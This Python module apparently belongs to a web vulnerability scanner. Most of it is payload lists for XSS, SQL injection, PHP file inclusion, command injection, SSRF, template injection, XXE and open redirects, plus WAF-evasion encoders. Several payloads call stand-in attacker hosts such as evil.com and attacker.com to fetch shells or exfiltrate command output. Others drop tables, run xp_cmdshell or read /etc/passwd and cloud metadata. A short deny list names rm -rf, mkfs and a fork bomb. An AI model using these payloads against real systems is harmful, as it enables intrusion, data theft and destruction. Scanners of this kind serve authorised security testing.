# scanner/fuzzer.py
# ──────────────────────────────────────────────────────────────────────────────
# SENTINEL SMART FUZZER — Elite payload generation with WAF bypass chains,
# PHP-specific attacks, polyglots, encoding mutations, and blind vectors.
# ──────────────────────────────────────────────────────────────────────────────

import random
import urllib.parse
import base64
import html
import re
from typing import List, Dict, Set, Callable, Optional, Union
from dataclasses import dataclass
from enum import Enum


# ─────────────────────────────────────────────────────────────────────────────
# XSS PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    # Classic
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    # Attribute injection
    '" onmouseover=alert(1) x="',
    "' onfocus=alert(1) autofocus '",
    '" onclick=alert(1) "',
    # JS context
    "';alert(1);//",
    '";alert(1);//',
    "`;alert(1)//",
    # Filter bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script >alert(1)</script >",
    "<img/src=x onerror=alert(1)>",
    "<<script>alert(1)//<</script>",
    "<svg><script>alert(1)</script></svg>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    # HTML entity bypass
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # URL encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # Double encoded
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Null byte injection (PHP legacy)
    "<scri\x00pt>alert(1)</scri\x00pt>",
    # Unicode bypass
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    # JSON context
    '"};</script><script>alert(1)//</script>',
    # Template injection XSS (for Vue/Angular/React misuse)
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    "${7*7}",
    # DOM XSS sinks
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    # Polyglot - works in HTML, JS, URL contexts
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Mutation XSS
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    # CSS injection
    "<style>@keyframes x{}</style><b style='animation-name:x' onanimationstart=alert(1)></b>",
]

# ─────────────────────────────────────────────────────────────────────────────
# SQL INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    # Boolean-based
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    # Error-based (MySQL)
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    # Error-based (MSSQL)
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    "'; EXEC xp_cmdshell('whoami')--",
    # Error-based (PostgreSQL)
    "' AND 1=CAST((SELECT version()) AS int)--",
    # Time-based blind (MySQL)
    "' AND SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    # Time-based blind (MSSQL)
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    # Time-based blind (PostgreSQL)
    "'; SELECT pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",
    # Time-based blind (Oracle)
    "' OR 1=1 AND ROWNUM=1 AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--",
    # Stacked queries
    "'; INSERT INTO users(username,password) VALUES('hacked','hacked')--",
    "'; DROP TABLE users--",
    # Second-order injection
    "admin'--",
    "admin'#",
    # WAF bypass encodings
    "'/**/OR/**/1=1--",
    "' /*!OR*/ 1=1--",
    "'+OR+1=1--",
    "%27+OR+1%3D1--",
    "' OR 0x313d31--",
    # NoSQL injection
    '{"$gt": ""}',
    '{"$where": "1==1"}',
    "' || '1'=='1",
    # PHP type juggling with SQL
    "' OR 1='1",
    "' OR '1",
]

# ─────────────────────────────────────────────────────────────────────────────
# PHP-SPECIFIC PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

PHP_PAYLOADS = [
    # PHP object injection
    'O:8:"stdClass":0:{}',
    'a:1:{i:0;O:8:"stdClass":0:{}}',
    # PHP type juggling
    "0e462097431906509019562988736854",  # MD5 magic hash
    "0",
    "0.0",
    "true",
    "null",
    "[]",
    # PHP LFI
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "/etc/passwd\x00",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHA gc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "zip://uploads/evil.zip#shell.php",
    # PHP RFI
    "http://evil.com/shell.txt?",
    "https://evil.com/shell.txt?",
    # PHP session injection
    "../../tmp/sess_PHPSESSIONID",
    # PHP eval injection
    "system('id');",
    "${system('id')}",
    "<?php system('id'); ?>",
    # PHP SSTI (template engines commonly used with PHP)
    "{{7*7}}",
    "{php}echo `id`;{/php}",
    "{% for x in range(1,10) %}{{x}}{% endfor %}",
    # PHP deserialization gadgets (generic)
    'C:11:"ArrayObject":30:{x:i:0;a:1:{s:3:"key";s:5:"value";}}',
    # PHP open_basedir bypass
    "http://127.0.0.1:80/",
    # Null byte (legacy PHP < 5.3)
    "file.php%00.jpg",
    "/etc/passwd%00",
]

# ─────────────────────────────────────────────────────────────────────────────
# COMMAND INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "&& id",
    "|| id",
    "; whoami",
    "$(id)",
    "`id`",
    "; sleep 5",
    "| sleep 5",
    "; ping -c 5 127.0.0.1",
    # Blind CMDI
    "; nslookup $(whoami).attacker.com",
    "| curl http://attacker.com/`whoami`",
    # Windows
    "& whoami",
    "| whoami",
    "& ping -n 5 127.0.0.1",
    # Encoded
    "%3Bid",
    "%7Cid",
    "%26%26+id",
]

# ─────────────────────────────────────────────────────────────────────────────
# SSRF PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0x7f000001",           # hex 127.0.0.1
    "http://2130706433",           # decimal 127.0.0.1
    "http://169.254.169.254",      # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba
    "http://192.168.0.1",
    "http://10.0.0.1",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
    "ldap://127.0.0.1",
    "sftp://evil.com",
    # SSRF bypass via DNS rebinding
    "http://attacker-rebinding.com",
    # Redirect-based SSRF
    "http://127.0.0.1.nip.io",
    "http://spoofed.127.0.0.1.xip.io",
]

# ─────────────────────────────────────────────────────────────────────────────
# SSTI PAYLOADS (Server-Side Template Injection)
# ─────────────────────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "{{config}}",
    "{{self.__dict__}}",
    # Jinja2 RCE
    "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # FreeMarker
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    # Velocity
    '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()',
    # Smarty (PHP)
    "{php}echo `id`;{/php}",
    "{system('id')}",
]

# ─────────────────────────────────────────────────────────────────────────────
# XXE PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
    # Billion laughs (DoS)
    '<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;">]><lol>&b;</lol>',
]

# ─────────────────────────────────────────────────────────────────────────────
# OPEN REDIRECT PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//evil%2ecom",
    "https:evil.com",
    "/%09/evil.com",
    "//%00evil.com",
    "https://evil.com@legitimate.com",
    "https://legitimate.com.evil.com",
]

# ─────────────────────────────────────────────────────────────────────────────
# PATH TRAVERSAL PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\windows\\win.ini",
    # Null byte truncation
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=../../config.php",
]

# ─────────────────────────────────────────────────────────────────────────────
# HEADER INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

HEADER_INJECTION_PAYLOADS = [
    "\r\nX-Injected: true",
    "%0d%0aX-Injected: true",
    "%0aX-Injected: true",
    "\nX-Injected: true",
    "\r\nSet-Cookie: admin=1",
    "%0d%0aLocation: https://evil.com",
]

# ─────────────────────────────────────────────────────────────────────────────
# ENUMS AND DATA STRUCTURES
# ─────────────────────────────────────────────────────────────────────────────

class VulnType(Enum):
    XSS = "xss"
    SQLI = "sqli"
    PHP = "php"
    CMDI = "cmdi"
    SSRF = "ssrf"
    SSTI = "ssti"
    TRAVERSAL = "traversal"
    REDIRECT = "redirect"
    XXE = "xxe"
    HEADER = "header"

@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    mutations_per_payload: int = 4
    max_payloads_per_type: int = 100
    include_oob: bool = True
    include_time_based: bool = True

# ─────────────────────────────────────────────────────────────────────────────
# WAF BYPASS ENCODING STRATEGIES
# ─────────────────────────────────────────────────────────────────────────────

def _url_encode(p: str) -> str:
    return urllib.parse.quote(p)

def _double_url_encode(p: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(p))

def _html_encode(p: str) -> str:
    return html.escape(p)

def _base64_encode(p: str) -> str:
    return base64.b64encode(p.encode()).decode()

def _comment_break(p: str) -> str:
    """Break keywords with SQL/HTML comments to evade signature matching."""
    return p.replace("OR", "/**/OR/**/").replace("UNION", "UN/**/ION").replace("SELECT", "SE/**/LECT")

def _case_mangle(p: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p))

def _space_to_tab(p: str) -> str:
    return p.replace(" ", "\t")

def _space_to_newline(p: str) -> str:
    return p.replace(" ", "\n")

def _space_to_comment(p: str) -> str:
    return p.replace(" ", "/**/")

def _plus_encode(p: str) -> str:
    return p.replace(" ", "+")

def _unicode_encode(p: str) -> str:
    """Convert characters to unicode escape sequences."""
    return ''.join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in p)

def _hex_encode(p: str) -> str:
    """Convert to hex representation."""
    return ''.join(f"\\x{ord(c):02x}" for c in p)

MUTATION_STRATEGIES = [
    lambda x: x,                   # raw
    _url_encode,
    _double_url_encode,
    _html_encode,
    _base64_encode,
    _comment_break,
    _case_mangle,
    _space_to_tab,
    _space_to_newline,
    _space_to_comment,
    _plus_encode,
    _unicode_encode,
    _hex_encode,
    lambda x: x.replace("script", "scri\x00pt"),  # null byte bypass
    lambda x: x.replace("script", "scr\tipt"),     # tab bypass
    lambda x: x.upper(),
    lambda x: x.lower(),
]

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD VALIDATION AND SANITIZATION
# ─────────────────────────────────────────────────────────────────────────────

def _sanitize_payload(payload: str) -> str:
    """Basic payload sanitization to prevent self-harm."""
    # Remove any potential command execution that could harm the scanner
    payload = re.sub(r'(?:;|\||\&\&|\|\|)\s*(?:rm\s+-rf|shutdown|halt|reboot|mkfs|dd\s+if=/dev/random)', '', payload, flags=re.IGNORECASE)
    return payload

def _is_dangerous_payload(payload: str) -> bool:
    """Check if payload could potentially harm the scanning system."""
    dangerous_patterns = [
        r'rm\s+-rf',
        r'shutdown',
        r'halt',
        r'reboot',
        r'mkfs',
        r'dd\s+if=/dev/random',
        r':(){:|:&};:',  # Fork bomb
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    return False

# ─────────────────────────────────────────────────────────────────────────────
# MAIN FUZZER CLASS
# ─────────────────────────────────────────────────────────────────────────────

class SmartFuzzer:
    """
    Elite payload fuzzer with:
    - 8 vulnerability categories
    - PHP-specific vectors
    - WAF bypass encoding chains
    - Polyglot payloads
    - Blind (time-based / OOB) payloads
    - Controlled mutation with configurable depth
    """

    PAYLOAD_SETS = {
        VulnType.XSS: XSS_PAYLOADS,
        VulnType.SQLI: SQLI_PAYLOADS,
        VulnType.PHP: PHP_PAYLOADS,
        VulnType.CMDI: CMDI_PAYLOADS,
        VulnType.SSRF: SSRF_PAYLOADS,
        VulnType.SSTI: SSTI_PAYLOADS,
        VulnType.TRAVERSAL: TRAVERSAL_PAYLOADS,
        VulnType.REDIRECT: REDIRECT_PAYLOADS,
        VulnType.XXE: XXE_PAYLOADS,
        VulnType.HEADER: HEADER_INJECTION_PAYLOADS,
    }

    TYPE_MAPPING = {
        "xss": VulnType.XSS,
        "sqli": VulnType.SQLI,
        "sql injection": VulnType.SQLI,
        "cmdi": VulnType.CMDI,
        "command": VulnType.CMDI,
        "ssrf": VulnType.SSRF,
        "ssti": VulnType.SSTI,
        "lfi": VulnType.TRAVERSAL,
        "rfi": VulnType.PHP,
        "traversal": VulnType.TRAVERSAL,
        "redirect": VulnType.REDIRECT,
        "php": VulnType.PHP,
        "xxe": VulnType.XXE,
        "header": VulnType.HEADER,
    }

    def __init__(self, config: Optional[PayloadConfig] = None):
        self.config = config or PayloadConfig()
        self._payload_cache: Dict[VulnType, List[str]] = {}

    def generate(self, context_payloads: list, mutations_per: Optional[int] = None) -> list:
        """
        Generates all payloads from context list + base sets, each with mutations.
        Returns a deduplicated list.
        """
        mutations = mutations_per or self.config.mutations_per_payload
        results: Set[str] = set()

        # Context-provided payloads + mutations
        for p in context_payloads:
            if not _is_dangerous_payload(p):
                sanitized = _sanitize_payload(p)
                results.add(sanitized)
                for _ in range(mutations):
                    mutated = self.mutate(sanitized)
                    if not _is_dangerous_payload(mutated):
                        results.add(mutated)

        # All base payload sets
        for category, payloads in self.PAYLOAD_SETS.items():
            for p in payloads:
                if not _is_dangerous_payload(p):
                    sanitized = _sanitize_payload(p)
                    results.add(sanitized)
                    # One random mutation per base payload (keeps set size manageable)
                    mutated = self.mutate(sanitized)
                    if not _is_dangerous_payload(mutated):
                        results.add(mutated)

        return list(results)[:self.config.max_payloads_per_type]

    def generate_for_type(self, vuln_type: str, mutations_per: Optional[int] = None) -> list:
        """
        Returns a focused, deeply mutated payload list for a specific vulnerability type.
        """
        mutations = mutations_per or self.config.mutations_per_payload
        category = self.TYPE_MAPPING.get(vuln_type.lower().strip(), VulnType.SQLI)
        
        # Check cache first
        if category in self._payload_cache:
            return self._payload_cache[category]
        
        base = self.PAYLOAD_SETS.get(category, SQLI_PAYLOADS)
        results: Set[str] = set()

        for p in base:
            if not _is_dangerous_payload(p):
                sanitized = _sanitize_payload(p)
                results.add(sanitized)
                for _ in range(mutations):
                    mutated = self.mutate(sanitized)
                    if not _is_dangerous_payload(mutated):
                        results.add(mutated)

        result_list = list(results)[:self.config.max_payloads_per_type]
        self._payload_cache[category] = result_list
        return result_list

    def mutate(self, payload: str) -> str:
        strategy = random.choice(MUTATION_STRATEGIES)
        try:
            result = strategy(payload)
            return _sanitize_payload(result)
        except Exception:
            return _sanitize_payload(payload)

    def get_time_based_payloads(self) -> list:
        """Returns payloads specifically for detecting blind time-based injections."""
        time_based = [
            "' AND SLEEP(6)--",
            "1; WAITFOR DELAY '0:0:6'--",
            "'; SELECT pg_sleep(6)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(6)))A)--",
            "; sleep 6",
            "| sleep 6",
            "$(sleep 6)",
            "`sleep 6`",
        ]
        return [_sanitize_payload(p) for p in time_based if not _is_dangerous_payload(p)]

    def get_oob_payloads(self, oast_domain: str) -> list:
        """Returns out-of-band (OOB/OAST) payloads for blind detection."""
        oob_payloads = [
            f"' AND LOAD_FILE('\\\\\\\\{oast_domain}\\\\share\\\\a')--",
            f"'; exec master..xp_dirtree '\\\\{oast_domain}\\share'--",
            f"| nslookup {oast_domain}",
            f"$(nslookup {oast_domain})",
            f"`nslookup {oast_domain}`",
            f"; curl http://{oast_domain}/cmdi",
            f"http://{oast_domain}/ssrf",
            f"//attacker.{oast_domain}/redirect",
            # XXE OOB
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_domain}/xxe">]><foo>&xxe;</foo>',
        ]
        return [_sanitize_payload(p) for p in oob_payloads if not _is_dangerous_payload(p)]

    def get_all_payloads(self, include_types: Optional[List[str]] = None) -> Dict[str, List[str]]:
        """
        Returns all payloads organized by type.
        
        Args:
            include_types: List of vulnerability types to include (None for all)
            
        Returns:
            Dictionary mapping vulnerability types to payload lists
        """
        result = {}
        types_to_include = include_types or [t.value for t in VulnType]
        
        for vuln_type in types_to_include:
            if vuln_type in self.TYPE_MAPPING:
                payloads = self.generate_for_type(vuln_type)
                result[vuln_type] = payloads
        
        return result

    def clear_cache(self) -> None:
        """Clear the payload cache."""
        self._payload_cache.clear()


# Singleton instance for backward compatibility
_fuzzer: Optional[SmartFuzzer] = None

def get_fuzzer() -> SmartFuzzer:
    """Get or create SmartFuzzer instance."""
    global _fuzzer
    if _fuzzer is None:
        _fuzzer = SmartFuzzer()
    return _fuzzer
